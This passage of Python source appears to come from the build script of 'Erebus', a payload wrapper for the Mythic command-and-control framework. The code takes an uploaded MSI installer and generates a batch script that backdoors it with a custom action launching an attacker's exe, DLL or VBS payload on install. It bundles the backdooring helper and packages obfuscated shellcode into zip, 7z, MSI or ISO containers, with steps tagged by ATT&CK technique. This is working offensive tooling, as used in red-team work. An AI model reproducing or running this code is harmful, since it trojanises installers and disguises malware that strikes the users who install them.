                msi_backdoor_uuid = self.get_parameter("5.4 MSI Backdoor File")
                if msi_backdoor_uuid:
                    # Download the MSI content
                    file_resp = await SendMythicRPCFileGetContent(
                        MythicRPCFileGetContentMessage(AgentFileId=msi_backdoor_uuid)
                    )
                    if not file_resp.Success or not file_resp.Content:
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="[T1218.007] - Staging MSI",
                            StepStdout="Failed to download uploaded MSI file from Mythic",
                            StepSuccess=False,
                        ))
                    else:
                        file_content = await getFileFromMythic(
                            agentFileId=msi_backdoor_uuid
                        )

                        # Resolve original filename via Mythic file search
                        original_msi_name = f"source_{msi_backdoor_uuid}.msi"
                        try:
                            name_resp = await SendMythicRPCFileSearch(
                                MythicRPCFileSearchMessage(AgentFileID=msi_backdoor_uuid)
                            )
                            if name_resp.Success and name_resp.Files:
                                candidate = name_resp.Files[0].Filename
                                if candidate and candidate.lower().endswith(".msi"):
                                    original_msi_name = candidate
                        except Exception:
                            pass  # fall back to uuid-based name

                        # Stage the source MSI into payload_dir
                        msi_payload_dir = Path(agent_build_path) / "payload"
                        msi_payload_dir.mkdir(parents=True, exist_ok=True)
                        staged_source_msi = msi_payload_dir / original_msi_name
                        staged_source_msi.write_bytes(file_content)

                        # Collect build parameters for the helper invocation
                        msi_attack_type   = self.get_parameter("5.5 MSI Attack Type") or "execute"
                        msi_entry_point   = self.get_parameter("5.6 MSI Entry Point") or ""
                        msi_command_args  = self.get_parameter("5.7 MSI Command Arguments") or ""
                        msi_condition     = self.get_parameter("5.8 MSI Execution Condition") or "NOT REMOVE"
                        msi_custom_action = self.get_parameter("5.9 MSI Custom Action Name") or ""

                        if not msi_custom_action:
                            import random as _r, string as _s
                            msi_custom_action = ''.join(_r.choices(_s.ascii_letters, k=8))

                        # Determine expected payload filename based on attack type
                        if msi_attack_type in ("load-dll", "dotnet"):
                            msi_payload_filename = "erebus.dll"
                        elif msi_attack_type == "script":
                            msi_payload_filename = "erebus.vbs"
                        else:
                            msi_payload_filename = "erebus.exe"

                        backdoored_name = f"{Path(original_msi_name).stem}-backdoored.msi"

                        # Build the erebus_helper.py command line with all parameters baked in
                        cmd_parts = [
                            "python erebus_helper.py msi",
                            f'--msi-file "{original_msi_name}"',
                            f'--payload "{msi_payload_filename}"',
                            f'--output "{backdoored_name}"',
                            f'--attack-type {msi_attack_type}',
                            f'--condition "{msi_condition}"',
                            f'--custom-action-name {msi_custom_action}',
                        ]
                        if msi_entry_point:
                            cmd_parts.append(f'--entry-point "{msi_entry_point}"')
                        if msi_command_args:
                            cmd_parts.append(f'--arguments "{msi_command_args}"')

                        bat_lines = [
                            "@echo off",
                            "REM Erebus MSI Backdoor - run this on the Windows target after extracting the archive.",
                            "REM Requires: python erebus_helper.py (bundled) + the payload executable.",
                            "REM Requires Python 3.11 or lower for MSILib to work correctly (Python 3.12+ deprecates MSILib).",
                            "",
                            " ^\r\n    ".join(cmd_parts),
                            "",
                            "if %errorlevel% neq 0 (",
                            "    echo [!] Backdooring failed - check parameters and re-run manually.",
                            ") else (",
                            f'    echo [+] Backdoored MSI written to: {backdoored_name}',
                            ")",
                        ]
                        bat_path = msi_payload_dir / "backdoor_msi.bat"
                        bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")

                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="[T1218.007] - Staging MSI",
                            StepStdout=(
                                f"Staged: {original_msi_name}\n"
                                f"Run backdoor_msi.bat on Windows to produce {backdoored_name}\n"
                                f"Attack: {msi_attack_type}  |  Action: {msi_custom_action}  |  Condition: {msi_condition}"
                            ),
                            StepSuccess=True,
                        ))

            ######################### End Of MSI Backdooring Section #########################
            ######################### Windows Helper Export #########################

            # Export Erebus.Helper as a single merged Python script so it
            # can be run directly (python erebus_helper.py <cmd>) or compiled
            # to a standalone exe with PyInstaller on the target Windows host.
            try:
                helper_src = Path(__file__).parent.parent / "agent_code" / "Erebus.Helper"
                helper_out = Path(agent_build_path) / "payload" / "erebus_helper.py"

                if helper_src.exists():
                    self._bundle_helper_as_single_file(helper_src, helper_out)
                    output += "[+] Exported Erebus.Helper as erebus_helper.py\n"

                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="[T1036] - Exporting Helper",
                        StepStdout="Exported Erebus.Helper as single-file erebus_helper.py",
                        StepSuccess=True,
                    ))
            except Exception as e:
                output += f"[!] Warning: Failed to export helper: {str(e)}\n"

            ######################### IOCs Generation #########################

            # Add all files in payload directory to IOCs list
            if os.path.exists(payload_dir):
                for root, dirs, files in os.walk(payload_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        self.add_to_iocs(iocs_list, file_path, generation_timestamp)

            # Generate IOCs file
            iocs_file_path = os.path.join(payload_dir, "IOCs.txt")
            self.generate_iocs_file(iocs_list, iocs_file_path)
            output += f"[+] Generated IOCs file: IOCs.txt ({len(iocs_list)} files tracked)\n"

            await SendMythicRPCPayloadUpdatebuildStep(
                MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="[T1005] - Gathering Files",
                StepStdout=f"Generated IOCs tracking file with {len(iocs_list)} hashes",
                StepSuccess=True,
            ))

            ######################### Final Payload / Container #########################

            # 1. Capture context for container function
            if 'payload_path' in locals():
                final_path = payload_path
            else:
                final_path = obfuscated_shellcode_path

            self.generated_payload_path = final_path
            self.agent_build_path = agent_build_path

            # 2. Attempt Containerization
            container_path = await self.containerise_payload(agent_build_path)

            if container_path:
                # Case A: Container created (7z/MSI)
                with open(container_path, "rb") as f:
                    response.payload = f.read()

                container = self.get_parameter("3.0 Container Type")
                match container:
                    case "7z":
                        ext = "7z"
                    case "Zip":
                        ext = "zip"
                    case "MSI":
                        ext = "msi"
                    case "ISO":
                        ext = "iso"
                    case _:
                        ext = "bin"

                response.updated_filename = f"payload.{ext}"
                response.status = BuildStatus.Success
                response.build_message = f"Success! Containerized ({container})"

                await SendMythicRPCPayloadUpdatebuildStep(
                    MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="[T1027] - Containerising",
                    StepStdout=f"Payload packaged into {container} container",
                    StepSuccess=True,
                ))

            return response

        except Exception as e:
            response.status = BuildStatus.Error
            response.build_message = f"Error building wrapper: {str(e)}\n{output}"
            return response
